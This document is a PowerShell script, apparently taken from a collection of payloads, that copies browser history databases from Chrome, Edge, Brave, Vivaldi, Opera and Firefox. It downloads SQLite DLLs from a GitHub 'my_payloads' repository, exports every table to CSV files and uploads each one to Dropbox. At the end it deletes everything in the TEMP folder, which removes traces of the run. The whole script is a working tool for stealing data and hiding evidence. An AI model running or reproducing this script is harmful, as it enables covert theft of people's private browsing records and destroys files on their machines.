# Define browser paths
$BrowserHistoryPaths = @{
    "Opera" = "$env:APPDATA\Opera Software\Opera Stable\History"
}

# Find all profiles in chrome and msedge
$ChromeDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$EdgeDataPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
$BraveDataPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
$VivaldiDataPath = "$env:LOCALAPPDATA\Vivaldi\User Data"

$chromeProfiles = Get-ChildItem -Path $ChromeDataPath -Directory -Force | Where-Object { $_.Name -match "Default|Profile \d+" }
$edgeProfiles = Get-ChildItem -Path $EdgeDataPath -Directory -Force | Where-Object { $_.Name -match "Default|Profile \d+" }
$braveProfiles = Get-ChildItem -Path $BraveDataPath -Directory -Force | Where-Object { $_.Name -match "Default|Profile \d+" }
$vivaldiProfiles = Get-ChildItem -Path $VivaldiDataPath -Directory -Force | Where-Object { $_.Name -match "Default|Profile \d+" }

foreach ($chromeProfile in $chromeProfiles) {
    $HistoryPath = Join-Path -Path $chromeProfile.FullName -ChildPath "History"
    if (Test-Path $HistoryPath -PathType Leaf) {
        $BrowserHistoryPaths["Google_Chrome_$($chromeProfile.Name)"] = $HistoryPath
    }
}

foreach ($edgeProfile in $edgeProfiles) {
    $HistoryPath = Join-Path -Path $edgeProfile.FullName -ChildPath "History"
    if (Test-Path $HistoryPath -PathType Leaf) {
        $BrowserHistoryPaths["Microsoft_Edge_$($edgeProfile.Name)"] = $HistoryPath
    }
}

foreach ($braveProfile in $braveProfiles){
    $HistoryPath = Join-Path -Path $braveProfile.FullName -ChildPath "History"
    if(Test-Path $HistoryPath -PathType Leaf){
        $BrowserHistoryPaths["Brave_$($braveProfile.Name)"] = $HistoryPath
    }
}

foreach ($vivaldiProfile in $vivaldiProfiles){
    $HistoryPath = Join-Path -Path $vivaldiProfile.FullName -ChildPath "History"
    if(Test-Path $HistoryPath -PathType Leaf){
        $BrowserHistoryPaths["Vivaldi_$($vivaldiProfile.Name)"] = $HistoryPath
    }
}

# Find firefox history
$FirefoxProfilesPath =  "$env:APPDATA\Mozilla\Firefox\Profiles"

if(Test-Path $FirefoxProfilesPath -PathType Container){
    $Profiles = Get-ChildItem -Path $FirefoxProfilesPath -Directory -Force

    foreach($p in $Profiles){

        $FirefoxHistorydb = "$FirefoxProfilesPath\$($p.Name)\places.sqlite"

        if(Test-Path $FirefoxHistorydb -PathType Leaf){
            $BrowserHistoryPaths["Firefox_$($p.Name)"] = $FirefoxHistorydb
        }
    }
}

# SQLite DLL Paths
$SQLiteDllPath = "$env:TEMP\System.Data.SQLite.dll"
$SQLiteInteropPath = "$env:TEMP\SQLite.Interop.dll"

# Download SQLite DLLs if missing
if (-not (Test-Path $SQLiteDllPath)) {
    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/System.Data.SQLite.dll" -outfile $SQLiteDllPath
}
if (-not (Test-Path $SQLiteInteropPath)) {
    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/SQLite.Interop.dll" -outfile $SQLiteInteropPath
}

# Load SQLite Assembly
Add-Type -Path $SQLiteDllPath -ErrorAction Stop

# Function to clean up temporary files
function Cleanup-TempFiles {
    param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [string]$TempDB
    )
    if (Test-Path $TempDB) {
        Remove-Item -Path $TempDB -Force -ErrorAction SilentlyContinue
    }
}

function DropBox-Upload {

    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$SourceFilePath
    ) 

    $DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN"   # Replace with your DropBox Access Token
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath="/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $DropBoxAccessToken
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

# Function to extract and save all tables from the database
function Export-AllTables {
    param (
        [Parameter(Mandatory=$true)]
        [string]$TempDB,
        
        [Parameter(Mandatory=$true)]
        [string]$Browser
    )

    # Connect to SQLite
    $Connection = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$TempDB;Version=3;"
    $Connection.Open()

    try {
        # Get all table names
        $Command = $Connection.CreateCommand()
        $Command.CommandText = "SELECT name FROM sqlite_master WHERE type='table';"
        $Reader = $Command.ExecuteReader()

        $Tables = @()
        while ($Reader.Read()) {
            $Tables += $Reader["name"]
        }
        $Reader.Close()

        # Loop through each table and export its data
        foreach ($Table in $Tables) {
            Write-Output "Exporting table: $Table from $Browser"

            $Query = "SELECT * FROM [$Table];"
            $Command.CommandText = $Query
            $Reader = $Command.ExecuteReader()

            $TableData = @()
            while ($Reader.Read()) {
                $Row = @{}
                for ($i = 0; $i -lt $Reader.FieldCount; $i++) {
                    $ColumnName = $Reader.GetName($i)
                    $ColumnValue = $Reader.GetValue($i)
                    $Row[$ColumnName] = $ColumnValue
                }
                $TableData += New-Object PSObject -Property $Row
            }
            $Reader.Close()

            # Save table data to CSV
            $CsvPath = "$env:TEMP\$env:USERNAME-$Browser-$Table-$(Get-Date -Format dd-MMMM-yyyy_hh-mm-ss)-History.csv"
            if ($TableData.Count -gt 0) {
                $TableData | Export-Csv -Path $CsvPath -NoTypeInformation
                Write-Output "Saved: $CsvPath"
                $CsvPath | DropBox-Upload
            } else {
                Write-Output "Table $Table from $Browser has 0 entries, skipping..."
            }
            Write-Output ""
        }
    }
    catch {
        Write-Error "Error exporting tables from ${Browser}: $_"
    }
    finally {
        $Command.Dispose()
        $Connection.Close()
        $Connection.Dispose()
    }
}

# Iterate through detected browsers
foreach ($Browser in $BrowserHistoryPaths.Keys) {
    $HistoryDB = $BrowserHistoryPaths[$Browser]

    if (Test-Path $HistoryDB) {
        try {
            # Create a temporary copy to avoid file lock issues
            $TempDB = "$env:TEMP\${Browser}_History.db"
            Copy-Item -Path $HistoryDB -Destination $TempDB -Force
            Export-AllTables -TempDB $TempDB -Browser $Browser
        }
        catch {
            Write-Error "An error occurred while processing ${Browser}: $_"
        }
        finally {
            Cleanup-TempFiles -TempDB $TempDB
        }
    }
    else{
    	Write-Output "The ${Browser} history file has not been found."
    }
}

Start-Process powershell -ArgumentList "-Command Remove-Item '$env:TEMP\*' -Force -Recurse -ErrorAction SilentlyContinue" -NoNewWindow
